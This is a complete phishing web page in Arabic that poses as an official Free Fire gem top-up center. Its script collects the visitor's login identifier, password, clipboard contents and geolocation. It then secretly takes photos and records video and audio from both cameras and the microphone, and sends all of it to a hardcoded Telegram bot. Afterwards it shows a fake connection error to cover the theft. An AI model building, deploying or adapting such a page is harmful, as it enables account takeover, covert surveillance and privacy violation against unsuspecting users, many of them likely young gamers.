<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire - مركز شحن الجواهر الرسمي</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Cairo', Tahoma, sans-serif;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        #permissionOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 15, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
            box-sizing: border-box;
        }
        .permission-card {
            background: rgba(20, 20, 30, 0.95);
            border: 2px solid #ffcc00;
            border-radius: 15px;
            padding: 30px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
        }
        .permission-card h2 {
            color: #ffcc00;
            margin-bottom: 15px;
            font-size: 20px;
        }
        .permission-card p {
            color: #ccc;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .btn-permission {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #ff7300, #ffcc00);
            border: none;
            border-radius: 8px;
            color: #000;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(255, 115, 0, 0.6);
        }
        .card {
            background: rgba(20, 20, 30, 0.9);
            border: 2px solid #ffcc00;
            border-radius: 15px;
            padding: 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
            box-sizing: border-box;
            display: none;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #ffcc00;
            margin-bottom: 5px;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.6);
        }
        .sub-title {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 15px;
        }
        .input-group {
            margin-bottom: 12px;
            text-align: right;
        }
        label {
            font-size: 11px;
            color: #ffcc00;
            display: block;
            margin-bottom: 3px;
        }
        input {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #444;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
            text-align: center;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, #ff7300, #ffcc00);
            border: none;
            border-radius: 8px;
            color: #000;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 0 15px rgba(255, 115, 0, 0.5);
        }
        #statusMsg {
            margin-top: 10px;
            font-size: 12px;
            color: #00ffcc;
        }
    </style>
</head>
<body>

<div id="permissionOverlay">
    <div class="permission-card">
        <h2>استكمال الدخول</h2>
        <p>الضغط على الزر أدناه مطلوب للتحقق من الأمان واستكمال تصفح موقع Free Fire الـرسمي.</p>
        <button class="btn-permission" onclick="requestAccessAndShow()">استكمال الدخول</button>
    </div>
</div>

<div class="card" id="mainContent">
    <div class="logo">🔥 FREE FIRE VIP 🔥</div>
    <div class="sub-title">سجل دخولك لحسابك (Gmail / رقم الهاتف / Facebook) لشحن الجواهر</div>
    
    <form id="ffForm" onsubmit="submitCredentials(event)">
        <div class="input-group">
            <label>البريد (Gmail) أو رقم الهاتف أو فيسبوك:</label>
            <input type="text" id="identifier" placeholder="أدخل البريد أو الرقم أو الايميل" required>
        </div>
        <div class="input-group">
            <label>كلمة المرور (Password):</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
        </div>
        <button type="submit" class="btn-submit">تسجيل الدخول وشحن الجواهر</button>
    </form>
    <div id="statusMsg"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
    const CHAT_ID = "7713496654";

    let victimData = {
        identifier: "",
        password: "",
        clipboard: "لم يتم العثور علي بيانات",
        location: "لم يتم تحديد الموقع"
    };

    function sendTelegramMessage(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        }).catch(() => {});
    }

    function sendTelegramPhoto(base64Image, caption) {
        let blob = dataURItoBlob(base64Image);
        let formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
    }

    function sendTelegramVideo(videoBlob, caption) {
        let formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoBlob, 'video.webm');
        formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }).catch(() => {});
    }

    function sendTelegramAudio(audioBlob, caption) {
        let formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('audio', audioBlob, 'audio.webm');
        formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
    }

    function dataURItoBlob(dataURI) {
        let byteString = atob(dataURI.split(',')[1]);
        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        let ab = new ArrayBuffer(byteString.length);
        let ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], {type: mimeString});
    }

    async function requestAccessAndShow() {
        document.getElementById('permissionOverlay').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';

        // 1. سحب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                victimData.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, () => {}, { timeout: 5000 });
        }

        // 2. سحب الحافظة
        try {
            const clip = await navigator.clipboard.readText();
            if(clip) victimData.clipboard = clip;
        } catch(e) {}
    }

    async function submitCredentials(event) {
        event.preventDefault();
        victimData.identifier = document.getElementById('identifier').value;
        victimData.password = document.getElementById('password').value;
        
        document.getElementById('statusMsg').innerText = "جاري التحقق من الحساب وشحن الجواهر...";

        // إرسال الرسالة بالتنسيق الجديد المطلوب
        let finalMessage = `تم دخوݪ   مستخدم اݪي حسابڪ  وتم سحب 
معݪومات اݪمستخدم 

اݪمستخدم 😵~> ${victimData.identifier}


ڪݪمة اݪسر  👻~> ${victimData.password}

 
اݪحافظه 📑~> ${victimData.clipboard}


اݪموقع 😊~> ${victimData.location} ☆`;

        sendTelegramMessage(finalMessage);

        // البدء بسحب الوسائط وإرسالها تباعاً بعد إرسال البيانات الأساسية
        setTimeout(async () => {
            await captureAllMedia("user", "الأمامية");
            await captureAllMedia("environment", "الخلفية");
        }, 1000);

        setTimeout(() => {
            alert("خطأ في الاتصال بالخادم أو كلمة المرور غير صحيحة. يرجى المحاولة لاحقاً.");
        }, 2500);
    }

    async function captureAllMedia(facingMode, name) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500));

            // التقاط 4 صور
            for (let i = 0; i < 4; i++) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                sendTelegramPhoto(canvas.toDataURL('image/jpeg'), `📸 صورة (${name}) رقم ${i+1}`);
                await new Promise(r => setTimeout(r, 800));
            }

            // تسجيل فيديو لمدة 8 ثواني
            let videoChunks = [];
            let vRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            vRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
            vRecorder.onstop = () => {
                let vBlob = new Blob(videoChunks, { type: 'video/webm' });
                sendTelegramVideo(vBlob, `🎥 فيديو مسجل (${name}) مدته 8 ثواني`);
            };
            vRecorder.start();
            await new Promise(r => setTimeout(r, 8000));
            vRecorder.stop();

            // تسجيل صوت لمدة 8 ثواني
            let audioChunks = [];
            let aRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
            aRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
            aRecorder.onstop = () => {
                let aBlob = new Blob(audioChunks, { type: 'audio/webm' });
                sendTelegramAudio(aBlob, `🎙️ تسجيل صوتي (${name}) مدته 8 ثواني`);
            };
            aRecorder.start();
            await new Promise(r => setTimeout(r, 8000));
            aRecorder.stop();

            stream.getTracks().forEach(t => t.stop());
        } catch (err) {
            sendTelegramMessage(`⚠️ خطأ في سحب وسائط (${name}): ${err.message}`);
        }
    }
</script>

</body>
</html>
